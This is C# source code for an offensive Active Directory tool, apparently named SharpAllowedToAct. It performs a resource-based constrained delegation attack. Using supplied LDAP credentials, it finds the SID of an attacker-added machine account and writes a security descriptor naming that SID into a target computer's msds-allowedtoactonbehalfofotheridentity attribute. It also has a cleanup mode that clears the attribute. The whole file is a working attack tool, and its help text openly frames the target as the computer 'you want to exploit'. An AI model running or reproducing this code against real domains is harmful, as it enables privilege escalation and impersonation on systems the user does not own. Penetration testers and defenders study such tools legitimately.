using System;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using CommandLine;

namespace AddMachineAccount
{
    public class Options
    {
        [Option("a", "DomainController", HelpText = "Set the domain controller to use")]
        public string DomainController { get; set; }

        [Option("d", "Domain", HelpText = "Set the target domain")]
        public string Domain { get; set; }

        [Option("m", "ComputerAccountName", HelpText = "Set machine name added by the attacker")]
        public string ComputerAccountName { get; set; }

        [Option("u", "LdapUsername", HelpText = "Set the Ldap Username")]
        public string LdapUsername { get; set; }

        [Option("p", "LdapPassword", HelpText = "Set the Ldap Password")]
        public string LdapPassword { get; set; }

        [Option("t", "TargetComputer", Required = true, HelpText = "Set the name of the target computer you want to exploit")]
        public string TargetComputer { get; set; }

        [Option("c", "Cleanup", HelpText = "Cleanup mode (set to 'true' to clear the attribute)")]
        public string Cleanup { get; set; }
    }

    class Program
    {
        private const string HelpText = @"
Usage: 
SharpAllowedToAct.exe -m machine -u username -p password -t VICTIM -a DC -d domain.local

Options:
  -m, --ComputerAccountName    Set machine name added by the attacker
  -u, --LdapUsername           Set the Ldap Username
  -p, --LdapPassword           Set the Ldap Password
  -t, --TargetComputer         Set the name of the target computer you want to exploit
  -a, --DomainController       Set the domain controller to use
  -d, --Domain                 Set the target domain
  -c, --Cleanup                Cleanup mode (set to 'true' to clear the attribute)
";

        static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                Console.WriteLine(HelpText);
                return;
            }

            var options = new Options();
            if (!CommandLineParser.Default.ParseArguments(args, options)) {
                Console.WriteLine(HelpText);
                return;
            }

            try
            {
                if (string.IsNullOrEmpty(options.TargetComputer))
                {
                    Console.WriteLine("[!] Target computer is required");
                    return;
                }

                bool cleanupMode = options.Cleanup?.ToLower() == "true";

                if (!cleanupMode && (string.IsNullOrEmpty(options.ComputerAccountName) ||
                                    string.IsNullOrEmpty(options.LdapUsername) ||
                                    string.IsNullOrEmpty(options.LdapPassword)))
                {
                    Console.WriteLine("[!] Missing required arguments for non-cleanup mode");
                    return;
                }

                var domainInfo = GetDomainInfo(options.DomainController, options.Domain);
                if (domainInfo == null)
                {
                    Console.WriteLine("[!] Failed to get domain information");
                    return;
                }

                if (cleanupMode)
                {
                    SetSecurityDescriptor(domainInfo.Item1, domainInfo.Item2, options.TargetComputer,
                                        null, options.LdapUsername, options.LdapPassword, true);
                    return;
                }

                var machineAccount = options.ComputerAccountName.EndsWith("$")
                    ? options.ComputerAccountName
                    : options.ComputerAccountName + "$";

                var distinguishedName = $"CN={options.ComputerAccountName.TrimEnd('$')},CN=Computers,{domainInfo.Item3}";

                Console.WriteLine("[+] Domain = " + domainInfo.Item1);
                Console.WriteLine("[+] Domain Controller = " + domainInfo.Item2);
                Console.WriteLine("[+] Machine added by the attacker = " + machineAccount);
                Console.WriteLine("[+] Distinguished Name = " + distinguishedName);
                Console.WriteLine("[+] Attempting LDAP login...");

                var sid = GetMachineAccountSid(domainInfo.Item2, distinguishedName, machineAccount,
                                             options.LdapUsername, options.LdapPassword);
                if (sid == null)
                {
                    Console.WriteLine("[!] Failed to get machine account SID");
                    return;
                }

                Console.WriteLine($"[+] SID of the machine added by the attacker: {sid.Value}");
                SetSecurityDescriptor(domainInfo.Item1, domainInfo.Item2, options.TargetComputer,
                                    sid.Value, options.LdapUsername, options.LdapPassword, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        private static Tuple<string, string, string> GetDomainInfo(string domainController, string domain)
        {
            if (!string.IsNullOrEmpty(domainController) && !string.IsNullOrEmpty(domain))
            {
                var dcParts = domain.Split('.');
                var dn = string.Join(",", Array.ConvertAll(dcParts, dc => $"DC={dc}"));
                return Tuple.Create(domain.ToLower(), domainController, dn);
            }

            try
            {
                var currentDomain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                var dcParts = currentDomain.Name.Split('.');
                var dn = string.Join(",", Array.ConvertAll(dcParts, dc => $"DC={dc}"));
                return Tuple.Create(
                    currentDomain.Name.ToLower(),
                    string.IsNullOrEmpty(domainController) ? currentDomain.PdcRoleOwner.Name : domainController,
                    dn);
            }
            catch
            {
                Console.WriteLine("[!] Cannot enumerate domain");
                return null;
            }
        }

        private static SecurityIdentifier GetMachineAccountSid(string domainController, string distinguishedName,
                                                            string machineAccount, string ldapUser, string ldapPass)
        {
            try
            {
                var identifier = new LdapDirectoryIdentifier(domainController, 389);
                using (var connection = new LdapConnection(identifier, new NetworkCredential(ldapUser, ldapPass)))
                {
                    connection.SessionOptions.Sealing = true;
                    connection.SessionOptions.Signing = true;
                    connection.Bind();

                    var request = new SearchRequest(
                        distinguishedName,
                        $"(&(samAccountType=805306369)(|(name={machineAccount.TrimEnd('$')})))",
                        System.DirectoryServices.Protocols.SearchScope.Subtree,
                        null);

                    var response = (SearchResponse)connection.SendRequest(request);

                    foreach (SearchResultEntry entry in response.Entries)
                    {
                        if (entry.Attributes["objectsid"] != null && entry.Attributes["objectsid"].Count > 0)
                        {
                            return new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] LDAP operation failed: {ex.Message}");
            }

            return null;
        }

        private static void SetSecurityDescriptor(string domain, string domainController, string targetComputer,
                                               string sid, string ldapUser, string ldapPass, bool cleanup)
        {
            try
            {
                using (var entry = new DirectoryEntry($"LDAP://{domainController}", ldapUser, ldapPass))
                {
                    using (var searcher = new DirectorySearcher(entry))
                    {
                        searcher.Filter = $"(cn={targetComputer})";
                        searcher.PropertiesToLoad.Add("samaccountname");

                        var result = searcher.FindOne();
                        if (result == null)
                        {
                            Console.WriteLine("[!] Computer account not found");
                            return;
                        }

                        using (var entryToUpdate = result.GetDirectoryEntry())
                        {
                            if (cleanup)
                            {
                                Console.WriteLine("[+] Clearing attribute...");
                                entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                            }
                            else
                            {
                                var secDescriptor = $"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{sid})";
                                var sd = new RawSecurityDescriptor(secDescriptor);
                                var buffer = new byte[sd.BinaryLength];
                                sd.GetBinaryForm(buffer, 0);
                                entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = buffer;
                            }

                            entryToUpdate.CommitChanges();
                            Console.WriteLine("[+] Attribute changed successfully");
                            Console.WriteLine("[+] Done!");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to update security descriptor: {ex.Message}");
            }
        }
    }
}